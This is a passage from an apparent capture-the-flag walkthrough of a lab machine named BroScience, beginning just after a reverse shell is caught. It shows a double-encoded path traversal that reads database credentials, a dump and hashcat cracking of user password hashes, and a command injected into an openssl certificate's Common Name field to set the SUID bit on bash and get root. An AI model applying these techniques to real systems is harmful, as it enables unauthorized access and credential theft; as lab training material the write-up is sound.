[17:54:45] 0.0.0.0:1234: upgrading from /usr/bin/dash to /usr/bin/bash                      manager.py:957
[17:54:56] 10.10.11.195:38298: registered new host w/ db                                    manager.py:957
(local) pwncat$                                                                                           
(remote) www-data@broscience:/$ 
```
* So, got the remote shell
* Now it's time for the priviledge escalation

```
REMEMBER THIS:
❯ curl -k 'https://broscience.htb/includes/img.php?path=..%252F..%252F..%252F..%252F..%252F..%252F..%252Fvar%252Fwww%252Fhtml%252Fincludes%252Fdb_connect.php'
<?php
$db_host = "localhost";
$db_port = "5432";
$db_name = "broscience";
$db_user = "dbuser";
$db_pass = "RangeOfMotion%777";
$db_salt = "NaCl";

```

``` bash
(remote) www-data@broscience:/bin$ ls | grep *sql      
psql
(remote) www-data@broscience:/bin$                                                   psql -h localhost -d broscience -U dbuser -W
Password: 
psql (13.9 (Debian 13.9-0+deb11u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

broscience=> select * from users;
WARNING: terminal is not fully functional
-  (press RETURN) id |   username    |             password             |            email             |         activation
_code          | is_activated | is_admin |         date_created          
----+---------------+----------------------------------+------------------------------+-------------------
---------------+--------------+----------+-------------------------------
  1 | administrator | 15657792073e8a843d4f91fc403454e1 | administrator@broscience.htb | OjYUyL9R4NpM9LOFP0
T4Q4NUQ9PNpLHf | t            | t        | 2019-03-07 02:02:22.226763-05
  2 | bill          | 13edad4932da9dbb57d9cd15b66ed104 | bill@broscience.htb          | WLHPyj7NDRx10BYHRJ
PPgnRAYlMPTkp4 | t            | f        | 2019-05-07 03:34:44.127644-04
  3 | michael       | bd3dad50e2d578ecba87d5fa15ca5f85 | michael@broscience.htb       | zgXkcmKip9J5MwJjt8
SZt5datKVri9n3 | t            | f        | 2020-10-01 04:12:34.732872-04
  4 | john          | a7eed23a7be6fe0d765197b1027453fe | john@broscience.htb          | oGKsaSbjocXb3jwmnx
5CmQLEjwZwESt6 | t            | f        | 2021-09-21 11:45:53.118482-04
  5 | dmytro        | 5d15340bded5b9395d5d14b9c21bc82b | dmytro@broscience.htb        | 43p9iHX6cWjr9YhaUN
tWxEBNtpneNMYm | t            | f        | 2021-08-13 10:34:36.226763-04
  6 | abc           | 09f7446e14f9fe357e16c5f43a78422e | abc@abc.com                  | j7X4K073w1xdb8mHWD
lqZOVZrkNEYfGL | f            | f        | 2023-01-17 12:11:30.81959-05
(6 rows)
```
* now we have the hashes
* In regiser.php we find this line
* To create the new user it uses md5 salt

```
res = pg_execute($db_conn, "create_user_query", array($_POST['username'], md5($db_salt . $_POST['password']), $_POST['email'], $activation_code));

Remember from Enumeration 
md5($db_salt . $_POST['password']) == md5(NaCl . $_POST['password'])

bill  13edad4932da9dbb57d9cd15b66ed104

```


``` bash
❯ hashcat -m 20 -a 0 billHash.txt /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt --show
13edad4932da9dbb57d9cd15b66ed104:NaCl:iluvhorsesandgym

```
* We have a user account and password so we can login


``` bash
(remote) www-data@broscience:/$ su bill                                                                  
Password: 
bill@broscience:/$ pwd
bill@broscience:~$ pwd
/home/bill
bill@broscience:~$ cat user.txt 
faf3ae31439bd21c1b10bae79e573131
```
* Now that we've got the flag from the user
* Execute linpeas
* Execute pspy
* Explore directories and found renew_cert.sh in /opt/
* Download renew_cert.sh and see how it works

``` bash
openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /home/bill/Certs/broscience.key -out /home/bill/Certs/broscience.crt -days 1
/home/bill/Certs/broscience.crt -days 1
Generating a RSA private key
...................++++
..........................................................++++
writing new private key to '/home/bill/Certs/broscience.key'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:FL
Locality Name (eg, city) []:sl
Organization Name (eg, company) [Internet Widgits Pty Ltd]:sd
Organizational Unit Name (eg, section) []:sd        
Common Name (e.g. server FQDN or YOUR name) []:$(chmod +s /usr/bin/bash)
Email Address []:s
bill@broscience:~$ /usr/bin/bash -p
bill@broscience:~$ whoami
bill
bill@broscience:~$ nash    ^C
bill@broscience:~$ bash -p
bash-5.1# whoami
root
bash-5.1# cat /root/root.txt
6........................43
```

